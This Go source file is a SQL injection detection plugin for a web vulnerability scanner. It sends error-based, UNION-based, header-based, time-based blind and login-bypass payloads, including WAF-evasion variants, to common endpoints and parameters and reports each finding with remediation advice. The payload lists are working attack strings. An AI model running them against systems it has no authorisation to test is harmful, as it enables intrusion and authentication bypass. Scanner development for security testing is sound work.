package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ==================================================
// SQL INJECTION — v5.0 "Omni-SQLi"
// Error-based · UNION-based · Time-based · POST
// Header Injection · WAF Bypass · DB Fingerprint
// ==================================================
type SQLInjectionPlugin struct{}

func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Omni-SQLi v5)" }

func (p *SQLInjectionPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── Target endpoints ──────────────────────────────────────────────
	endpoints := []string{
		"/",
		"/index.php", "/login.php", "/product.php", "/cart.php",
		"/news.php", "/search.php", "/item.php", "/view.php",
		"/Default.aspx", "/Login.aspx", "/Products.aspx", "/Details.aspx",
		"/login", "/signin", "/search", "/view", "/products", "/items",
	}

	params := []string{
		"id", "cat", "item", "u", "user", "q", "search", "query",
		"p", "pid", "article_id", "news_id", "page", "product_id",
		"order", "sort", "category", "ref",
	}

	// ── DB error messages ────────────────────────────────────────────────
	dbErrors := []string{
		"SQL syntax", "mysql_fetch", "mysql_num_rows", "mysql_query",
		"ORA-01756", "ORA-00907", "Oracle Error", "Oracle JDBC",
		"PostgreSQL query failed", "pg_query()", "PSQLException",
		"SQLServer JDBC Driver", "Microsoft OLE DB Provider",
		"Unclosed quotation mark", "ODBC SQL Server Driver",
		"CLI Driver", "DB2 SQL error", "SQLite/JDBCDriver",
		"System.Data.SqlClient.SqlException", "Syntax error in query",
		"Warning: mysql_", "You have an error in your SQL syntax",
	}

	// ── DB fingerprint signatures ──────────────────────────────────────────
	dbFingerprints := map[string][]string{
		"MySQL":      {"mysql", "MySQL", "MariaDB", "mysql_fetch", "mysql_num_rows"},
		"PostgreSQL": {"PostgreSQL", "PSQLException", "pg_query", "pgsql"},
		"MSSQL":      {"SQLServer", "Microsoft OLE DB", "SqlException", "MSSQL", "WAITFOR"},
		"Oracle":     {"ORA-", "Oracle", "oracle.jdbc"},
		"SQLite":     {"SQLite", "sqlite3"},
	}

	fingerprintDB := func(body string) string {
		for db, sigs := range dbFingerprints {
			for _, sig := range sigs {
				if strings.Contains(body, sig) {
					return db
				}
			}
		}
		return "Unknown DB"
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 1 — Error-Based (smart guessing + WAF bypass payloads)
	// ══════════════════════════════════════════════════════════════════════
	errorPayloads := []string{
		// Klasik
		"'", "\"", "`", "' OR '1'='1",
		// WAF bypass — comment obfuscation
		"'/**/OR/**/'1'='1",
		"'%09OR%09'1'='1",
		"' /*!OR*/ '1'='1",
		// WAF bypass — null byte
		"'\u0000",
		// WAF bypass — double encode
		"%27",
		// WAF bypass — case variation
		"' Or '1'='1",
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range errorPayloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))
				resp, err := client.Get(targetURL)
				if err != nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()
				bodyStr := string(bodyBytes)

				for _, errMsg := range dbErrors {
					if strings.Contains(bodyStr, errMsg) {
						db := fingerprintDB(bodyStr)
						return &models.Vulnerability{
							Target:   target,
							Name:     "SQL Injection (Error-Based)",
							Severity: "CRITICAL",
							CVSS:     9.8,
							Description: fmt.Sprintf(
								"Database error triggered (Error-Based SQLi).\nURL: %s\nPayload: %s\nError Match: %s\nDetected DB: %s",
								targetURL, payload, errMsg, db,
							),
							Solution:  "Use Prepared Statements / Parameterized Queries.",
							Reference: "OWASP A03:2021 – Injection",
						}
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 2 — UNION-Based Detection
	// Number of columns via ORDER BY → canary with UNION SELECT NULL
	// ══════════════════════════════════════════════════════════════════════
	unionEndpoints := []string{"/", "/index.php", "/products", "/search", "/view"}
	unionParams := []string{"id", "cat", "item", "p", "product_id"}

	for _, ep := range unionEndpoints {
		for _, param := range unionParams {
			baseReqURL := fmt.Sprintf("%s%s?%s=1", baseURL, ep, param)
			baseResp, err := client.Get(baseReqURL)
			if err != nil {
				continue
			}
			baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 65536))
			baseResp.Body.Close()

			// Find number of columns via ORDER BY (between 1-10)
			columns := 0
			for i := 1; i <= 10; i++ {
				orderURL := fmt.Sprintf("%s%s?%s=1 ORDER BY %d--", baseURL, ep, param, i)
				resp, err := client.Get(orderURL)
				if err != nil {
					break
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()

				// Error = i-1 columns found
				for _, errMsg := range dbErrors {
					if strings.Contains(string(body), errMsg) {
						columns = i - 1
						break
					}
				}
				// Also stop if response size drops
				if columns > 0 {
					break
				}
				if len(body) < len(baseBody)/2 && i > 1 {
					columns = i - 1
					break
				}
			}
			if columns > 0 {
				// Test canary using UNION SELECT NULL,NULL,...
				nulls := strings.Repeat(",NULL", columns-1)
				canary := "DORM_UNION_8x7k"
				unionPayload := fmt.Sprintf("0 UNION SELECT '%s'%s--", canary, nulls)
				unionURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(unionPayload))

				resp, err := client.Get(unionURL)
				if err != nil {
					continue
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()

				if strings.Contains(string(body), canary) {
					return &models.Vulnerability{
						Target:   target,
						Name:     "SQL Injection (UNION-Based Data Extraction)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"UNION-Based SQL Injection confirmed successfully — canary string was displayed in response.\nEndpoint: %s\nParam: %s\nColumns Count: %d\nCanary Payload: %s",
							ep, param, columns, unionPayload,
						),
						Solution:  "Use parameterized queries. Do not show application errors to the user.",
						Reference: "OWASP A03:2021 – Injection",
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 3 — Spider Endpoint Integration (GET + POST)
	// ══════════════════════════════════════════════════════════════════════
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					for _, payload := range errorPayloads {
						u, err := url.Parse(ep.URL)
						if err != nil {
							continue
						}
						q := u.Query()
						q.Set(param, payload)
						u.RawQuery = q.Encode()

						resp, err := client.Get(u.String())
						if err != nil {
							continue
						}
						bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
						resp.Body.Close()
						bodyStr := string(bodyBytes)

						for _, errMsg := range dbErrors {
							if strings.Contains(bodyStr, errMsg) {
								db := fingerprintDB(bodyStr)
								return &models.Vulnerability{
									Target:   target,
									Name:     "SQL Injection (Spider-Discovered Endpoint)",
									Severity: "CRITICAL",
									CVSS:     9.8,
									Description: fmt.Sprintf(
										"Database error triggered on spider-discovered endpoint.\nURL: %s\nParam: %s  Payload: %s\nError: %s  DB: %s",
										u.String(), param, payload, errMsg, db,
									),
									Solution:  "Use Prepared Statements.",
									Reference: "OWASP A03:2021 – Injection",
								}
							}
						}
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 4 — Header Injection SQLi
	// User-Agent, X-Forwarded-For, Referer, X-Real-IP
	// ══════════════════════════════════════════════════════════════════════
	headerPayloads := []string{"'", "' OR '1'='1'--", "1' AND SLEEP(0)--"}
	headerNames := []string{"User-Agent", "X-Forwarded-For", "Referer", "X-Real-IP", "X-Custom-IP-Authorization"}

	for _, ep := range []string{"/", "/index.php", "/login", "/search"} {
		targetURL := baseURL + ep
		for _, hdr := range headerNames {
			for _, payload := range headerPayloads {
				req, err := http.NewRequest("GET", targetURL, nil)
				if err != nil {
					continue
				}
				req.Header.Set(hdr, payload)

				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()
				bodyStr := string(bodyBytes)

				for _, errMsg := range dbErrors {
					if strings.Contains(bodyStr, errMsg) {
						db := fingerprintDB(bodyStr)
						return &models.Vulnerability{
							Target:   target,
							Name:     "SQL Injection (Header Injection)",
							Severity: "HIGH",
							CVSS:     8.5,
							Description: fmt.Sprintf(
								"SQL injection successfully triggered via HTTP header.\nEndpoint: %s\nHeader: %s\nPayload: %s\nError: %s  DB: %s",
								targetURL, hdr, payload, errMsg, db,
							),
							Solution:  "Treat all HTTP header values as untrusted user inputs and use parameterized queries.",
							Reference: "CWE-89: SQL Injection via HTTP Headers",
						}
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 5 — Time-Based Blind SQLi
	// ══════════════════════════════════════════════════════════════════════
	sleepSeconds := 5
	timePayloads := map[string]string{
		"MySQL/MariaDB": fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
		"PostgreSQL":    fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepSeconds),
		"MSSQL":         fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
	}

	for dbType, payload := range timePayloads {
		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
		start := time.Now()
		resp, err := client.Get(targetURL)
		duration := time.Since(start)
		if err == nil {
			resp.Body.Close()
		}
		if duration.Seconds() >= float64(sleepSeconds) {
			return &models.Vulnerability{
				Target:   target,
				Name:     fmt.Sprintf("Blind SQL Injection (Time-Based — %s)", dbType),
				Severity: "CRITICAL",
				CVSS:     9.9,
				Description: fmt.Sprintf(
					"Server response delayed by %.2f seconds — Time-Based Blind SQLi confirmed.\nDB Type: %s\nPayload: %s",
					duration.Seconds(), dbType, payload,
				),
				Solution:  "Validate inputs and use Prepared Statements.",
				Reference: "OWASP Blind SQL Injection",
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 6 — POST / Auth Bypass
	// ══════════════════════════════════════════════════════════════════════
	loginPages := []string{
		"/login.php", "/admin", "/admin.php", "/user/login",
		"/index.php", "/login.aspx", "/signin",
	}
	postPayloads := []string{
		"' OR '1'='1", "' OR 1=1 --", "admin' --", "admin' #",
		"\" OR \"1\"=\"1", "') OR ('1'='1",
	}
	formParams := []string{"username", "user", "email", "login", "id", "txtUser", "txtPassword"}

	for _, page := range loginPages {
		targetEndpoint := baseURL + page
		baseLen, err := getPostResponseLength(client, targetEndpoint, "invalid_user_x9", "invalid_pass_x9")
		if err != nil {
			continue
		}
		for _, payload := range postPayloads {
			for _, param := range formParams {
				_ = param
				attackLen, err := getPostResponseLength(client, targetEndpoint, payload, "123456")
				if err != nil {
					continue
				}
				diff := math.Abs(float64(attackLen - baseLen))
				if diff > 5 || (baseLen == 0 && attackLen > 500) {
					return &models.Vulnerability{
						Target:   target,
						Name:     "SQL Injection (POST/Auth Bypass)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"Login bypass detected via POST injection.\nEndpoint: %s\nPayload: %s\nResponse Diff: %.0f bytes",
							page, payload, diff,
						),
						Solution:  "Sanitize all POST inputs and use Prepared Statements (PDO).",
						Reference: "OWASP Injection / Authentication Bypass",
					}
				}
			}
		}
	}

	return nil
}
